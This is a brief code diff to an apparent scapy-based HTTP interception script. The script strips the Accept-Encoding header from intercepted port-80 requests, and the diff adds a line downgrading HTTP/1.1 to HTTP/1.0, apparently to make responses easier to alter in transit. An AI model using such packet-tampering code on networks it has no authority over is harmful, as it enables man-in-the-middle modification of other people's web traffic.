@@ -20,6 +20,7 @@ def process_packet(packet):
         if scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
             load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)                              # Replace the attribute that tells the server that our browser understands x encoding languages, we make it empty to force the server to send the response in plain text without encoding
+            load = load.replace(b"HTTP/1.1", b"HTTP/1.0")
 
         elif scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
